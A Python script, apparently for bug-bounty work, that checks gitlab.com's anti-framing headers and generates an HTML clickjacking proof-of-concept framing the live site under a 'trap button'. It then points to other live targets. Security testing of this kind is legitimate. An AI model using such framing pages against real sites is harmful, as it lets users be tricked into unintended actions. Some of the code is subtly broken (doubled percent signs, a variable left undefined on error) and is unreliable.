#!/usr/bin/env python3
"""
TEST GITLAB CLICKJACKING ATTACK - LIVE VALIDATION
==================================================
Test if GitLab clickjacking vulnerability is still exploitable.

Test: Check if gitlab.com can be embedded in iframe
Goal: Validate current vulnerability status
Action: Create updated PoC and test immediately

Copyright (c) 2025 DoctorMen
"""

import requests
import json
from datetime import datetime

def test_gitlab_clickjacking():
    """Test if GitLab clickjacking vulnerability still exists"""
    
    print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║          TEST GITLAB CLICKJACKING ATTACK - LIVE VALIDATION             ║
║          Check Current Status | Updated PoC | Immediate Test           ║
╚══════════════════════════════════════════════════════════════════════╝

🎯 TARGET: https://gitlab.com
🔍 TEST: Check X-Frame-Options and CSP headers
⚡ GOAL: Validate if vulnerability still exists
    """)
    
    # Test 1: Check HTTP headers
    print(f"\n📍 STEP 1: TESTING SECURITY HEADERS")
    
    try:
        response = requests.get("https://gitlab.com", timeout=10, allow_redirects=True)
        
        security_headers = {
            "X-Frame-Options": response.headers.get("X-Frame-Options"),
            "Content-Security-Policy": response.headers.get("Content-Security-Policy"),
            "X-Content-Type-Options": response.headers.get("X-Content-Type-Options"),
            "Referrer-Policy": response.headers.get("Referrer-Policy")
        }
        
        print(f"📊 SECURITY HEADERS ANALYSIS:")
        for header, value in security_headers.items():
            if value:
                print(f"   ✅ {header}: {value[:100]}...")
            else:
                print(f"   ❌ {header}: MISSING (VULNERABLE)")
        
        # Check if clickjacking protection exists
        x_frame_options = security_headers["X-Frame-Options"]
        csp = security_headers["Content-Security-Policy"]
        
        clickjacking_protected = False
        
        if x_frame_options:
            if "DENY" in x_frame_options or "SAMEORIGIN" in x_frame_options:
                clickjacking_protected = True
        
        if csp and "frame-ancestors" in csp:
            clickjacking_protected = True
        
        vulnerability_status = "PROTECTED" if clickjacking_protected else "VULNERABLE"
        
        print(f"\n🎯 CLICKJACKING STATUS: {vulnerability_status}")
        
    except Exception as e:
        print(f"❌ ERROR testing headers: {e}")
        vulnerability_status = "UNKNOWN"
    
    # Test 2: Create updated PoC
    print(f"\n📍 STEP 2: CREATING UPDATED POC")
    
    updated_poc = f"""<!DOCTYPE html>
<html>
<head>
    <title>GitLab Clickjacking Test - {datetime.now().strftime('%Y-%m-%d')}</title>
    <style>
        body {{ margin: 0; padding: 20px; font-family: Arial, sans-serif; background: #f5f5f5; }}
        .header {{ background: #fc6d26; color: white; padding: 20px; text-align: center; }}
        .test-container {{ position: relative; width: 90%%; max-width: 1200px; height: 600px; margin: 20px auto; }}
        .overlay {{ position: absolute; top: 0; left: 0; width: 100%%; height: 100%%; 
                    background: rgba(252, 109, 38, 0.1); z-index: 10; 
                    border: 3px solid #fc6d26; box-sizing: border-box; }}
        .trap-button {{ position: absolute; top: 150px; left: 200px; z-index: 20; 
                       padding: 15px 30px; background: #e24329; color: white; 
                       border: none; font-size: 16px; font-weight: bold; 
                       cursor: pointer; border-radius: 5px; }}
        iframe {{ width: 100%%; height: 100%%; border: 2px solid #fc6d26; }}
        .status {{ margin: 20px; padding: 15px; background: white; border-radius: 5px; }}
        .success {{ border-left: 5px solid #2ecc71; }}
        .failure {{ border-left: 5px solid #e74c3c; }}
        .evidence {{ margin: 20px; padding: 15px; background: white; border-radius: 5px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🎯 GitLab Clickjacking Vulnerability Test</h1>
        <p>Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Status: {vulnerability_status}</p>
    </div>
    
    <div class="status {'success' if vulnerability_status == 'VULNERABLE' else 'failure'}">
        <h3>🔍 Vulnerability Status: {vulnerability_status}</h3>
        <p>
            {'✅ VULNERABLE: GitLab can be embedded in iframe - Clickjacking possible!' if vulnerability_status == 'VULNERABLE' 
             else '❌ PROTECTED: GitLab has clickjacking protection in place'}
        </p>
    </div>
    
    <div class="test-container">
        <div class="overlay"></div>
        <button class="trap-button">⚠️ TRAP BUTTON</button>
        <iframe src="https://gitlab.com" 
                onload="showResult('SUCCESS: GitLab loaded in iframe!')" 
                onerror="showResult('ERROR: Failed to load GitLab')"></iframe>
    </div>
    
    <div class="evidence">
        <h3>📊 Evidence Collection:</h3>
        <ul>
            <li><strong>Target:</strong> https://gitlab.com</li>
            <li><strong>X-Frame-Options:</strong> {security_headers.get('X-Frame-Options', 'MISSING')}</li>
            <li><strong>Content-Security-Policy:</strong> {security_headers.get('Content-Security-Policy', 'MISSING')}</li>
            <li><strong>Test Result:</strong> {vulnerability_status}</li>
        </ul>
        
        <h3>💥 Exploitation Scenario:</h3>
        <p>If vulnerable, an attacker can:</p>
        <ul>
            <li>Embed GitLab in a malicious website</li>
            <li>Overlay invisible buttons on GitLab's interface</li>
            <li>Trick users into performing unintended actions</li>
            <li>Compromise user accounts and repositories</li>
        </ul>
    </div>
    
    <script>
        function showResult(message) {{
            alert(message);
        }}
        
        // Additional test: Try to interact with iframe
        window.addEventListener('load', function() {{
            setTimeout(function() {{
                const iframe = document.querySelector('iframe');
                try {{
                    // Test if we can access iframe content (same-origin check)
                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    console.log('Iframe access:', iframeDoc ? 'SUCCESS' : 'BLOCKED');
                }} catch(e) {{
                    console.log('Iframe access blocked by same-origin policy (expected)');
                }}
            }}, 2000);
        }});
    </script>
</body>
</html>"""
    
    # Save updated PoC
    poc_filename = f"gitlab_clickjacking_test_{int(datetime.now().timestamp())}.html"
    with open(poc_filename, 'w') as f:
        f.write(updated_poc)
    
    print(f"✅ UPDATED POC CREATED: {poc_filename}")
    
    # Test 3: Provide next steps
    print(f"""
📍 STEP 3: NEXT ACTIONS

🎯 IF VULNERABLE (Status: VULNERABLE):
   1. Open {poc_filename} in browser to verify
   2. Take screenshot of working PoC
   3. Check GitLab HackerOne scope for clickjacking
   4. Submit to GitLab program immediately
   
🎯 IF PROTECTED (Status: PROTECTED):
   1. GitLab has fixed the vulnerability
   2. Move to next target (Tesla, Uber, Shopify)
   3. Use MCP orchestrator to find new vulnerabilities
   4. Test other programs for similar issues

💰 POTENTIAL BOUNTY: $500-1,500 if still vulnerable
⏰ PAYMENT TIMELINE: 2-4 weeks after acceptance
    """)
    
    return {
        "status": vulnerability_status,
        "poc_file": poc_filename,
        "headers": security_headers,
        "next_steps": "Submit if vulnerable, pivot if protected"
    }

def main():
    """Execute GitLab clickjacking test"""
    
    print("""
🎯 TEST GITLAB CLICKJACKING ATTACK - LIVE VALIDATION
==================================================

✅ PURPOSE: Check if GitLab clickjacking still works
✅ METHOD: Test security headers + create updated PoC
✅ GOAL: Validate current vulnerability status
✅ ACTION: Submit if vulnerable, pivot if fixed

Let's test if this vulnerability is still exploitable!
    """)
    
    results = test_gitlab_clickjacking()
    
    print(f"""
✅ CLICKJACKING TEST COMPLETE

Status: {results['status']}
PoC File: {results['poc_file']}
Next Steps: {results['next_steps']}

🎯 OPEN THE POC FILE IN YOUR BROWSER TO VERIFY!
    """)

if __name__ == "__main__":
    main()
